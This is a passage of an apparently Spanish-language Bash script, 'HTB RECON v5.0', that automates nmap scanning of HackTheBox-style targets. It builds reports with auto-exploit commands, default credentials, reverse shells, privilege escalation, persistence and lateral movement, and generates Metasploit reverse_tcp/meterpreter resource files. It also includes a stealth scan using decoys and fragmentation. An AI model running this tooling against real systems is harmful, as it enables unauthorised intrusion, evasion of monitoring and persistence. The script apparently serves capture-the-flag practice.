    echo ""
    echo -e "${B}${M}  EXPLOTANDO PUERTOS SELECCIONADOS${W}"
    echo ""

    local COUNT=0
    for num in $ports_list; do
        num=$(echo "$num" | tr -d ' ')
        [[ "$num" =~ ^[0-9]+$ ]] || continue
        local PORTS_ARRAY_TEMP=()
        for P in $ALL_PORTS; do PORTS_ARRAY_TEMP+=("$P"); done
        local idx=$((num - 1))
        if [ "$idx" -ge 0 ] && [ "$idx" -lt "${#PORTS_ARRAY_TEMP[@]}" ]; then
            local p="${PORTS_ARRAY_TEMP[$idx]}"
            get_port_info "$p"
            local SVC="$SVC_INFO" PROD="$PROD_INFO" VER="$VER_INFO"
            COUNT=$((COUNT + 1))
            echo -e "${B}${C}[$COUNT] Puerto $p | $SVC | $PROD $VER${W}"
            echo ""
            get_auto_exploit "$SVC" "$PROD" "$VER" "$p"
            echo ""
        fi
    done

    if [ "$COUNT" -eq 0 ]; then
        echo -e "${R}  Ningun puerto valido seleccionado.${W}"
    fi
}

# ============================================================
# INTERACTIVE MODE
# ============================================================
interactive_mode() {
    echo -e "${B}  Modo Interactivo${W}"
    echo ""
    
    echo "  [1] Escaneo normal"
    echo "  [2] Escaneo rapido"
    echo "  [3] Escaneo completo"
    echo "  [4] Stealth mode"
    echo "  [5] Re-generar reporte (no-scan)"
    echo "  [6] Exportar a HTML"
    echo "  [7] Generar wordlist"
    echo "  [8] Comparar escaneos (diff)"
    echo "  [9] Ver historial de boxes"
    echo " [10] Actualizar base CVE"
    echo " [11] Escaneo + hosts + firefox (web assist)"
    echo "  [0] Salir"
    echo ""
    
    read -p "  Seleccion: " choice
    
    case "$choice" in
        1) MODE="normal" ;;
        2) MODE="fast" ;;
        3) MODE="full" ;;
        4) MODE="stealth" ;;
        5) NO_SCAN=1 ;;
        6) HTML_EXPORT=1 ;;
        7)
            read -p "  Target IP: " TARGET
            if [ -n "$TARGET" ]; then
                read -p "  Nombre de la maquina: " BOX_NAME
                [ -z "$BOX_NAME" ] && BOX_NAME="$TARGET"
                XML_FILE=$(ls -t "$OUTPUT_DIR"/scan_${TARGET}_*.xml 2>/dev/null | head -1)
                generate_wordlist "$TARGET" "$OUTPUT_DIR/wordlist_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
            fi
            return
            ;;
        8)
            read -p "  Target IP: " TARGET
            [ -n "$TARGET" ] && diff_scans "$TARGET"
            return
            ;;
        9) tracker_list; return ;;
        10) update_cve_database; return ;;
        11) MODE="normal"; WEB_AUTO=1 ;;
        0) exit 0 ;;
        *) echo -e "${R}  Opcion invalida${W}"; return ;;
    esac
    
    read -p "  Target IP: " TARGET
    if [ -z "$TARGET" ]; then
        echo -e "${R}  IP requerida${W}"
        return
    fi

    read -p "  Nombre de la maquina: " BOX_NAME
    if [ -z "$BOX_NAME" ]; then
        BOX_NAME="$TARGET"
    fi
    
    read -p "  Exportar a HTML? (s/n): " html_choice
    [ "$html_choice" = "s" ] && HTML_EXPORT=1
    
    scan_and_report
}

# ============================================================
# SCAN AND REPORT (CORE)
# ============================================================
scan_and_report() {
    mkdir -p "$OUTPUT_DIR"
    
    TS=$(date +"%Y%m%d_%H%M%S")
    [ -z "$BOX_NAME" ] && BOX_NAME="$TARGET"
    BOX_NAME=$(echo "$BOX_NAME" | tr -d ' /\\:*?"<>|')
    BOX_VERSION=$(get_next_version "$BOX_NAME")
    REPORT="$OUTPUT_DIR/ESCANEO_de_${BOX_NAME}_v${BOX_VERSION}.txt"
    HTML_REPORT="$OUTPUT_DIR/ESCANEO_de_${BOX_NAME}_v${BOX_VERSION}.html"
    XML_FILE="$OUTPUT_DIR/scan_${TARGET}_${TS}.xml"
    
    MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    [ -z "$MY_IP" ] && MY_IP="YOUR_IP"
    MSF_NEED_PAYLOAD=1
    MSF_PAYLOAD="linux/x64/shell_reverse_tcp"
    MSF_LPORT="4444"
    
    echo -e "${B}${C}"
    echo "========================================================"
    echo "  HTB RECON v5.0 - $TARGET"
    echo "========================================================"
    echo -e "${W}"
    echo -e "  Modo:    ${B}$MODE${W}"
    echo -e "  Box:     ${B}$BOX_NAME${W}"
    echo -e "  Version: ${B}v$BOX_VERSION${W}"
    echo -e "  Reporte: ${B}$REPORT${W}"
    echo -e "  Tu IP:   ${B}$MY_IP${W}"
    echo -e "${C}========================================================${W}"
    echo

    [ "$EUID" -ne 0 ] && echo -e "${Y}[!] No eres root. Algunas funciones pueden fallar.${W}\n"

    # FASE 1: ESCANEO
    if [ "$NO_SCAN" -eq 0 ]; then
        echo -e "${B}${M}[1/5] ESCANEO NMAP ($MODE)${W}\n"
        [ "$VERBOSE" -eq 1 ] && NMAP_V="-v"
        
        case "$MODE" in
            fast)
                echo -e "${C}  Top 1000 puertos, timeout corto${W}"
                vprint "Ejecutando: nmap -sC -sV --top-ports 1000 -Pn -n -T4 --host-timeout 5m -oX $XML_FILE $TARGET"
                nmap $NMAP_V -sC -sV --top-ports 1000 -Pn -n -T4 \
                    --host-timeout 5m \
                    -oX "$XML_FILE" "$TARGET" 2>&1
                ;;
            full)
                echo -e "${C}  Todos los puertos + scripts agresivos${W}"
                vprint "Ejecutando: nmap -sV -sC -A -O --version-intensity 9 --script=vulners,exploit,auth,brute,default -p- -Pn -n -T4 --host-timeout 30m -oX $XML_FILE $TARGET"
                nmap $NMAP_V -sV -sC -A -O --version-intensity 9 \
                    --script=vulners,exploit,auth,brute,default \
                    -p- -Pn -n -T4 \
                    --host-timeout 30m \
                    -oX "$XML_FILE" "$TARGET" 2>&1
                ;;
            stealth)
                echo -e "${C}  Stealth: SYN scan, T2, fragmentado, decoys${W}"
                vprint "Ejecutando: nmap -sS -T2 -f -D RND:10 --source-port 53 --scan-delay 3s --max-retries 2 --top-ports 100 -Pn -n --script=version --host-timeout 10m -oX $XML_FILE $TARGET"
                nmap $NMAP_V -sS -T2 -f -D RND:10 --source-port 53 \
                    --scan-delay 3s --max-retries 2 \
                    --top-ports 100 -Pn -n \
                    --script=version \
                    --host-timeout 10m \
                    -oX "$XML_FILE" "$TARGET" 2>&1
                ;;
            *)
                echo -e "${C}  Todos los puertos + deteccion de versiones + vulns${W}"
                vprint "Ejecutando: nmap -sV -sC -O --version-intensity 5 --script=vulners,default,auth -p- -Pn -n -T4 --host-timeout 15m -oX $XML_FILE $TARGET"
                nmap $NMAP_V -sV -sC -O --version-intensity 5 \
                    --script=vulners,default,auth \
                    -p- -Pn -n -T4 \
                    --host-timeout 15m \
                    -oX "$XML_FILE" "$TARGET" 2>&1
                ;;
        esac

        if [ ! -s "$XML_FILE" ]; then
            echo -e "${R}[!] Error: nmap no genero resultados.${W}"
            return 1
        fi
        echo
    else
        XML_FILE=$(ls -t "$OUTPUT_DIR"/scan_${TARGET}_*.xml 2>/dev/null | head -1)
        if [ -z "$XML_FILE" ]; then
            echo -e "${R}[!] No se encontro XML anterior para $TARGET${W}"
            return 1
        fi
        echo -e "${Y}[*] Usando XML existente: $XML_FILE${W}\n"
        vprint "Modo --no-scan: reutilizando XML existente sin ejecutar nmap"
    fi

    # FASE 2: BASE DE CONOCIMIENTO
    echo -e "${B}${M}[2/5] CARGANDO BASE DE CONOCIMIENTO...${W}"
    load_libraries
    local svc_count=$(echo ${!SVC_DESCRIPTION[@]} | tr ' ' '\n' | wc -l)
    echo -e "${G}  OK - $svc_count servicios | $(echo ${!CVE_LIN_DESCRIPTION[@]} | tr ' ' '\n' | wc -l) CVEs Linux | $(echo ${!CVE_WIN_DESCRIPTION[@]} | tr ' ' '\n' | wc -l) CVEs Windows${W}\n"
    vprint "Librerias cargadas desde $CVE_DB_DIR"
    vprint "Servicios documentados: $svc_count"

    # FASE 3: ANALISIS
    echo -e "${B}${M}[3/5] ANALIZANDO RESULTADOS...${W}\n"

    build_port_cache
    detect_os
    detect_ad
    vprint "SO detectado: ${DETECTED_OS^^} | AD: $([ "$DETECTED_AD" -eq 1 ] && echo SI || echo NO)"

    # Payload acorde al SO detectado
    if [ "$DETECTED_OS" = "windows" ]; then
        MSF_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
    else
        MSF_PAYLOAD="linux/x64/shell_reverse_tcp"
    fi

    # ---- Recopilar puertos abiertos ----
    local ALL_PORTS="" OPEN_COUNT=0
    for PORT in $(get_open_ports); do
        if [ "$(get_port_state "$PORT")" = "open" ]; then
            ALL_PORTS="$ALL_PORTS $PORT"
            OPEN_COUNT=$((OPEN_COUNT + 1))
            get_port_info "$PORT"
            vprint "Puerto abierto: $PORT/tcp | ${SVC_INFO:-?} ${PROD_INFO:-} ${VER_INFO:-}"
        fi
    done
    vprint "Total puertos abiertos: $OPEN_COUNT"

    # ---- INICIO DEL REPORTE ----
    cat > "$REPORT" << EOF
================================================================
  REPORTE DE RECON - HTB RECON v5.0
  Box: $BOX_NAME
  Version: v$BOX_VERSION
  Target IP: $TARGET
  Fecha: $(date '+%Y-%m-%d %H:%M:%S')
  Tu IP: $MY_IP
  Modo: $MODE
  SO: ${DETECTED_OS^^}
  AD: $([ "$DETECTED_AD" -eq 1 ] && echo "SI" || echo "NO")
================================================================

INDICE:
  1. Resumen del Host
  2. Puertos Abiertos
  3. CVEs de Nmap
  4. CVEs Base de Conocimiento
  5. Analisis Guiado por Servicio
  6. AUTO-EXPLOTACION
  7. Prioridades
  8. Comandos Rapidos
  9. REVERSE SHELLS
 10. ESCALADA DE PRIVILEGIOS
 11. POST-EXPLOTACION
 12. MOVIMIENTO LATERAL
EOF

    # ---- 1. RESUMEN ----
    echo "" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "  1. RESUMEN DEL HOST" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"
    
    local os_info=$(grep -oP 'name="\K[^"]+' "$XML_FILE" | grep -iE 'linux|windows|unix|bsd' | head -3)
    if [ -n "$os_info" ]; then
        echo "  Sistema Operativo:" >> "$REPORT"
        echo "$os_info" | while read -r os; do echo "    - $os" >> "$REPORT"; done
    fi
    echo "  Clasificacion: ${DETECTED_OS^^}" >> "$REPORT"
    echo "  AD: $([ "$DETECTED_AD" -eq 1 ] && echo "Detectado" || echo "No detectado")" >> "$REPORT"
    echo "" >> "$REPORT"

    # ---- 2. PUERTOS ----
    echo "================================================================" >> "$REPORT"
    echo "  2. PUERTOS ABIERTOS" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"

    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO" PROD="$PROD_INFO" VER="$VER_INFO"
        printf "  %-12s %-15s %-25s %s\n" "${PORT}/tcp" "${SVC^^}" "$PROD" "$VER" >> "$REPORT"
    done
    echo "" >> "$REPORT"
    echo "  Total: $OPEN_COUNT puertos abiertos" >> "$REPORT"
    echo "" >> "$REPORT"

    # ---- 3. CVEs NMAP ----
    echo "================================================================" >> "$REPORT"
    echo "  3. CVEs DETECTADOS POR NMAP" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"
    
    local CVE_LIST=$(get_nmap_vulns)
    if [ -n "$CVE_LIST" ]; then
        vprint "CVEs detectados por nmap:"
        while read -r cve; do
            echo "  ! $cve -> https://nvd.nist.gov/vuln/detail/$cve" >> "$REPORT"
            vprint "  - $cve"
        done <<< "$CVE_LIST"
    else
        echo "  Nmap no detecto CVEs via scripts." >> "$REPORT"
        vprint "Nmap no detecto CVEs via scripts"
    fi
    echo "" >> "$REPORT"

    # ---- 4. CVEs BASE DE CONOCIMIENTO ----
    echo "================================================================" >> "$REPORT"
    echo "  4. CVEs BASE DE CONOCIMIENTO" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"
    
    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO" PROD="$PROD_INFO"
        echo "  --- $SVC ($PROD) - Puerto $PORT ---" >> "$REPORT"
        
        show_cves_for_os "$SVC" "$PROD" "$VER_INFO" >> "$REPORT"
        echo "" >> "$REPORT"
    done

    # ---- 5. ANALISIS GUIADO ----
    echo "================================================================" >> "$REPORT"
    echo "  5. ANALISIS GUIADO POR SERVICIO" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"
    
    local SVC_NUM=0
    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO" PROD="$PROD_INFO" VER="$VER_INFO"
        SVC_NUM=$((SVC_NUM + 1))
        echo "----------------------------------------------------------------" >> "$REPORT"
        echo "  SERVICIO #$SVC_NUM - Puerto $PORT" >> "$REPORT"
        echo "----------------------------------------------------------------" >> "$REPORT"
        
        local info=$(get_service_info "$SVC" "$TARGET" "$PORT" 2>/dev/null)
        if [ -n "$info" ]; then
            echo "$info" >> "$REPORT"
        else
            echo "  SERVICIO: ${SVC^^} | PRODUCTO: $PROD | VERSION: $VER" >> "$REPORT"
            echo "  [!] No encontrado en base de conocimiento" >> "$REPORT"
        fi
        echo "" >> "$REPORT"
    done

    # ---- 6. AUTO-EXPLOTACION ----
    echo "================================================================" >> "$REPORT"
    echo "  6. AUTO-EXPLOTACION (COMANDOS LISTOS)" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"
    
    local AUTO_FOUND=0
    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO" PROD="$PROD_INFO" VER="$VER_INFO"
        local ae=$(get_auto_exploit "$SVC" "$PROD" "$VER" "$PORT")
        if [ -n "$ae" ]; then
            echo "  --- $SVC $PROD $VER (Puerto $PORT) ---" >> "$REPORT"
            echo "$ae" >> "$REPORT"
            AUTO_FOUND=$((AUTO_FOUND + 1))
            vprint "Auto-exploit encontrado en $PORT/tcp ($SVC $PROD $VER)"
        fi
    done
    [ "$AUTO_FOUND" -eq 0 ] && echo "  No se detectaron exploits automaticos." >> "$REPORT"
    vprint "Exploits automaticos encontrados: $AUTO_FOUND"
    echo "" >> "$REPORT"

    # ---- 7. PRIORIDADES ----
    echo "================================================================" >> "$REPORT"
    echo "  7. PRIORIDADES (QUE ATACAR PRIMERO)" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"
    
    local PRI=1
    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO"
        local sl=$(to_lower "$SVC")
        case "$sl" in
            ftp) echo "  $PRI. [ALTO] $PORT ($SVC) - Login anonimo" >> "$REPORT"; PRI=$((PRI+1)) ;;
            http|https) echo "  $PRI. [ALTO] $PORT ($SVC) - Dir fuzzing" >> "$REPORT"; PRI=$((PRI+1)) ;;
            smb|microsoft-ds|netbios-ssn) echo "  $PRI. [ALTO] $PORT ($SVC) - Null session" >> "$REPORT"; PRI=$((PRI+1)) ;;
            redis|mongodb) echo "  $PRI. [ALTO] $PORT ($SVC) - Sin auth" >> "$REPORT"; PRI=$((PRI+1)) ;;
            ldap) echo "  $PRI. [ALTO] $PORT ($SVC) - Anonymous bind" >> "$REPORT"; PRI=$((PRI+1)) ;;
            snmp) echo "  $PRI. [MEDIO] $PORT ($SVC) - Community strings" >> "$REPORT"; PRI=$((PRI+1)) ;;
            *) echo "  $PRI. [BAJO] $PORT ($SVC) - Manual" >> "$REPORT"; PRI=$((PRI+1)) ;;
        esac
    done
    echo "" >> "$REPORT"

    # ---- 8. COMANDOS RAPIDOS ----
    echo "================================================================" >> "$REPORT"
    echo "  8. COMANDOS RAPIDOS" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"
    
    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO"
        echo "  --- Puerto $PORT ($SVC) ---" >> "$REPORT"
        get_quick_commands "$SVC" "$PORT" >> "$REPORT"
        echo "" >> "$REPORT"
    done

    # ---- 8.5 CREDENCIALES POR DEFECTO ----
    echo "================================================================" >> "$REPORT"
    echo "  8.5 CREDENCIALES POR DEFECTO" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "" >> "$REPORT"
    
    local CREDS_FOUND=0
    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO"
        local creds_out=$(check_default_creds "$SVC" "$PORT" "$TARGET" 2>/dev/null)
        if [ -n "$creds_out" ] && ! echo "$creds_out" | grep -qi "no se encontraron"; then
            echo "  --- Puerto $PORT ($SVC) ---" >> "$REPORT"
            echo -e "$creds_out" >> "$REPORT"
            CREDS_FOUND=$((CREDS_FOUND + 1))
        fi
    done
    [ "$CREDS_FOUND" -eq 0 ] && echo "  No se encontraron credenciales por defecto para los servicios detectados." >> "$REPORT"
    echo "" >> "$REPORT"

    # ---- 9-12: POST-EXPLOTACION ----
    echo "================================================================" >> "$REPORT"
    echo "  9. REVERSE SHELLS (IP: $MY_IP)" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    get_reverse_shells "$MY_IP" "4444" >> "$REPORT"
    echo "" >> "$REPORT"

    echo "================================================================" >> "$REPORT"
    echo "  10. ESCALADA DE PRIVILEGIOS" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    [ "$DETECTED_OS" != "windows" ] && get_linux_privesc_vectors >> "$REPORT"
    [ "$DETECTED_OS" != "linux" ] && get_windows_privesc_vectors >> "$REPORT"
    echo "" >> "$REPORT"

    echo "================================================================" >> "$REPORT"
    echo "  11. POST-EXPLOTACION" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    echo "  --- TTY Stabilization ---" >> "$REPORT"
    get_tty_stabilization >> "$REPORT"
    echo "" >> "$REPORT"
    echo "  --- File Transfer ---" >> "$REPORT"
    get_file_transfer "$MY_IP" "8000" >> "$REPORT"
    echo "" >> "$REPORT"
    echo "  --- Persistencia ---" >> "$REPORT"
    get_persistence "$MY_IP" "4444" >> "$REPORT"
    echo "" >> "$REPORT"
    echo "  --- Herramientas ---" >> "$REPORT"
    get_useful_tools >> "$REPORT"
    echo "" >> "$REPORT"

    echo "================================================================" >> "$REPORT"
    echo "  12. MOVIMIENTO LATERAL" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    [ "$DETECTED_OS" != "windows" ] && get_linux_lateral_movement >> "$REPORT"
    [ "$DETECTED_OS" != "linux" ] && get_windows_lateral_movement >> "$REPORT"
    [ "$DETECTED_AD" -eq 1 ] && get_windows_ad_attack >> "$REPORT"
    echo "" >> "$REPORT"

    # ---- METASPLOIT ----
    echo "================================================================" >> "$REPORT"
    echo "  BONUS: METASPLOIT" >> "$REPORT"
    echo "================================================================" >> "$REPORT"
    
    generate_metasploit_rc
    local MSF_RC="$OUTPUT_DIR/msf_${TARGET}_${TS}.rc"
    local HANDLER_RC="$OUTPUT_DIR/handler_${TARGET}_${TS}.rc"

    echo "  MSF Resource: $MSF_RC" >> "$REPORT"
    echo "  MSF Handler:  $HANDLER_RC" >> "$REPORT"
    echo "" >> "$REPORT"
    vprint "Metasploit RC generado: $MSF_RC"
    vprint "Metasploit Handler: $HANDLER_RC"

    # ---- FOOTER ----
    echo "================================================================" >> "$REPORT"
    echo "  FIN - $(date '+%Y-%m-%d %H:%M:%S')" >> "$REPORT"
    echo "  Reporte: $REPORT" >> "$REPORT"
    echo "  XML: $XML_FILE" >> "$REPORT"
    echo "  MSF: $MSF_RC" >> "$REPORT"
    echo "================================================================" >> "$REPORT"

    # TRACKER: registrar box
    tracker_add "$BOX_NAME" "$DETECTED_OS" "$OPEN_COUNT" "scanned"

    # FASE 4: HTML
    if [ "$HTML_EXPORT" -eq 1 ]; then
        echo -e "${B}${M}[4/5] EXPORTANDO HTML...${W}"
        python3 -c "
import re
with open('$REPORT') as f:
    c = f.read().replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
c = re.sub(r'^(={40,})$', '<hr>', c, flags=re.M)
c = re.sub(r'^(  \d+\..+)$', r'<h2>\1</h2>', c, flags=re.M)
c = re.sub(r'(!!!.+!!!)', r'<span class=\"critical\">\1</span>', c)
c = re.sub(r'(\[ALTO\])', r'<span class=\"high\">\1</span>', c)
c = re.sub(r'(\[MEDIO\])', r'<span class=\"medium\">\1</span>', c)
c = re.sub(r'(CVE-\d+-\d+)', r'<span class=\"critical\">\1</span>', c)
html = '''<!DOCTYPE html><html><head><meta charset=\"UTF-8\">
<title>Recon - $TARGET</title>
<style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px}
pre{background:#111;border:1px solid #333;padding:15px;white-space:pre-wrap;border-radius:5px}
h2{color:#f0f;border-left:4px solid #f0f;padding-left:10px;margin-top:20px}
.critical{color:red;font-weight:bold}.high{color:#ff6600}.medium{color:#ff0}
hr{border-color:#333;margin:20px 0}</style></head><body>
<h1>Recon Report - $BOX_NAME</h1>
<p>Target IP: $TARGET | Fecha: $(date '+%Y-%m-%d %H:%M:%S') | SO: ${DETECTED_OS^^} | AD: $([ "$DETECTED_AD" -eq 1 ] && echo SI || echo NO)</p>
<hr><pre>''' + c + '</pre></body></html>'
with open('$HTML_REPORT', 'w') as f:
    f.write(html)
" 2>/dev/null
        echo -e "${G}  HTML: $HTML_REPORT${W}"
    fi

    # FASE 5: RESUMEN + MENU INTERACTIVO DE PUERTOS
    echo -e "${B}${M}[5/5] COMPLETADO${W}\n"
    echo -e "${B}${G}========================================================${W}"
    echo -e "${B}${G}  ESCANEO COMPLETADO v5.0${W}"
    echo -e "${B}${G}========================================================${W}"
    echo -e "  Reporte: ${B}$REPORT${W}"
    echo -e "  XML:     ${B}$XML_FILE${W}"
    echo -e "  MSF:     ${B}$MSF_RC${W}"
    [ "$HTML_EXPORT" -eq 1 ] && echo -e "  HTML:    ${B}$HTML_REPORT${W}"
    echo -e "${B}${G}========================================================${W}\n"
    
    echo -e "${B}${C}  PUERTOS:${W}"
    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO" PROD="$PROD_INFO" VER="$VER_INFO"
        echo -e "    ${G}$PORT/tcp${W}  ${SVC^^}  ${DIM}$PROD $VER${W}"
    done
    echo ""
    
    [ -n "$CVE_LIST" ] && echo -e "${B}${R}  CVEs: $(echo "$CVE_LIST" | wc -l) encontrados${W}\n"
    
    echo -e "${B}${C}  SIGUIENTE:${W}"
    echo -e "    msfconsole -r $MSF_RC"
    echo -e "    Revisa seccion AUTO-EXPLOTACION del reporte"
    echo ""

    # ---- MENU INTERACTIVO DE PUERTOS ----
    # Solo entra cuando hay terminal real (mantiene automatizacion en batch/CI)
    if [ -t 0 ]; then
        interactive_port_menu
    else
        vprint "Salida no interactiva (sin TTY): se omite el menu de puertos para no bloquear la automatizacion"
    fi

    # Web assist: abrir Firefox en puertos web y configurar /etc/hosts
    if [ "$WEB_AUTO" -eq 1 ]; then
        setup_hosts_and_browser
    fi
}

# ============================================================
# ENTRY POINT
# ============================================================

# Defaults
TARGET=""
MODE="normal"
NO_SCAN=0
HTML_EXPORT=0
BATCH_FILE=""
DO_LIST=0
DO_HISTORY=""
DO_MARK=""
DO_DIFF=""
DO_WORDLIST=0
DO_UPDATE_DB=0
DO_AUTO_EXPLOIT=0
DO_CREDS=0
DO_CREDS_LIST=0
DO_CREDS_SEARCH=""
DO_SUID=0
DO_SUID_LIST=0
DO_SUDO_ESC=0
DO_WL_CATEGORY="all"
WEB_AUTO=0
VERBOSE=0

# Parse args
while [ $# -gt 0 ]; do
    case "$1" in
        --fast) MODE="fast"; shift ;;
        --full) MODE="full"; shift ;;
        --stealth) MODE="stealth"; shift ;;
        --no-scan) NO_SCAN=1; shift ;;
        --html) HTML_EXPORT=1; shift ;;
        --auto) DO_AUTO_EXPLOIT=1; shift ;;
        --batch) [[ $# -lt 2 ]] && { echo "Error: --batch requiere <archivo>"; exit 1; }; BATCH_FILE="$2"; shift 2 ;;
        --wordlist) DO_WORDLIST=1; if [[ "$2" =~ ^(dirs|dir|directory|directories|subdomains|sub|dns|passwords|pass|pwd|users|user|usuarios|vhosts|vhost|virtual|params|param|parameters|wordpress|wp|joomla|drupal|ssh|sensitive|files|sensibles|all)$ ]]; then DO_WL_CATEGORY="$2"; shift 2; else DO_WL_CATEGORY="all"; shift; fi ;;
        --list) DO_LIST=1; shift ;;
        --history) [[ $# -lt 2 ]] && { echo "Error: --history requiere <nombre>"; exit 1; }; DO_HISTORY="$2"; shift 2 ;;
        --mark) [[ $# -lt 3 ]] && { echo "Error: --mark requiere <nombre> <status>"; exit 1; }; DO_MARK="$2"; NEW_STATUS="$3"; shift 3 ;;
        --diff) [[ $# -lt 2 ]] && { echo "Error: --diff requiere <ip>"; exit 1; }; DO_DIFF="$2"; shift 2 ;;
        --creds) DO_CREDS=1; shift ;;
        --creds-list) DO_CREDS_LIST=1; shift ;;
        --creds-search) [[ $# -lt 2 ]] && { echo "Error: --creds-search requiere <termino>"; exit 1; }; DO_CREDS_SEARCH="$2"; shift 2 ;;
        --suid) DO_SUID=1; shift ;;
        --suid-list) DO_SUID_LIST=1; shift ;;
        --sudo-escalation) DO_SUDO_ESC=1; shift ;;
        -v|--verbose) VERBOSE=1; shift ;;
        --update-db) DO_UPDATE_DB=1; shift ;;
        --web) WEB_AUTO=1; shift ;;
        -h|--help) usage 0 ;;
        -*) echo "Opcion desconocida: $1"; usage ;;
        *) TARGET="$1"; shift ;;
    esac
done

# Dispatch
show_banner
echo ""
if [ "$DO_LIST" -eq 1 ]; then
    load_libraries
    tracker_list
    exit 0
fi

if [ "$DO_CREDS_LIST" -eq 1 ]; then
    load_libraries
    get_all_default_creds
    exit 0
fi

if [ -n "$DO_CREDS_SEARCH" ]; then
    load_libraries
    search_default_creds "$DO_CREDS_SEARCH"
    exit 0
fi

if [ "$DO_SUID_LIST" -eq 1 ]; then
    load_libraries
    get_all_suid_exploits
    exit 0
fi

if [ "$DO_SUDO_ESC" -eq 1 ]; then
    load_libraries
    get_sudo_escalation
    exit 0
fi

if [ -n "$DO_HISTORY" ]; then
    load_libraries
    tracker_history "$DO_HISTORY"
    exit 0
fi

if [ -n "$DO_MARK" ]; then
    load_libraries
    tracker_mark "$DO_MARK" "$NEW_STATUS"
    exit 0
fi

if [ -n "$DO_DIFF" ]; then
    load_libraries
    diff_scans "$DO_DIFF"
    exit 0
fi

if [ "$DO_WORDLIST" -eq 1 ]; then
    load_libraries
    show_wordlists "$DO_WL_CATEGORY"
    exit 0
fi

if [ "$DO_UPDATE_DB" -eq 1 ]; then
    update_cve_database
    exit 0
fi

if [ -n "$BATCH_FILE" ]; then
    if [ ! -f "$BATCH_FILE" ]; then
        echo -e "${R}  Archivo no encontrado: $BATCH_FILE${W}"
        exit 1
    fi
    load_libraries
    local_count=$(wc -l < "$BATCH_FILE")
    echo -e "${B}${C}  BATCH MODE: $local_count targets${W}\n"
    current=0
    while IFS= read -r target; do
        target=$(echo "$target" | tr -d '[:space:]')
        [ -z "$target" ] && continue
        [[ "$target" == \#* ]] && continue
        current=$((current + 1))
        echo -e "${B}${M}  [$current/$local_count] Escaneando: $target${W}\n"
        TARGET="$target"
        scan_and_report
        echo -e "\n${B}${G}  [$current/$local_count] Completado: $target${W}\n"
    done < "$BATCH_FILE"
    echo -e "${B}${G}========================================================${W}"
    echo -e "${B}${G}  BATCH COMPLETADO: $current targets escaneados${W}"
    echo -e "${B}${G}========================================================${W}"
    exit 0
fi

if [ "$DO_SUID" -eq 1 ]; then
    [ -z "$TARGET" ] && { echo "Uso: $0 --suid <target>"; exit 1; }
    load_libraries
    XML_FILE=$(ls -t "$OUTPUT_DIR"/scan_${TARGET}_*.xml 2>/dev/null | head -1)
    scan_suid_binaries
    exit 0
fi

if [ "$DO_CREDS" -eq 1 ]; then
    [ -z "$TARGET" ] && { echo "Uso: $0 --creds <target>"; exit 1; }
    load_libraries
    print_section "CREDENCIALES POR DEFECTO PARA $TARGET"
    XML_FILE=$(ls -t "$OUTPUT_DIR"/scan_${TARGET}_*.xml 2>/dev/null | head -1)
    if [ -f "$XML_FILE" ]; then
        build_port_cache
        for PORT in $(get_open_ports); do
            get_port_info "$PORT"
            check_default_creds "$SVC_INFO" "$PORT" "$TARGET"
            echo ""
        done
    else
        echo -e "${Y}  No se encontro XML del target. Ejecuta primero: ${G}./usame.sh $TARGET${W}"
    fi
    exit 0
fi

# Sin args = interactivo
if [ -z "$TARGET" ]; then
    load_libraries
    interactive_mode
    exit 0
fi

# Scan normal
scan_and_report

# Si --auto, ejecutar auto-exploit despues del scan
if [ "$DO_AUTO_EXPLOIT" -eq 1 ]; then
    auto_exploit_all
fi
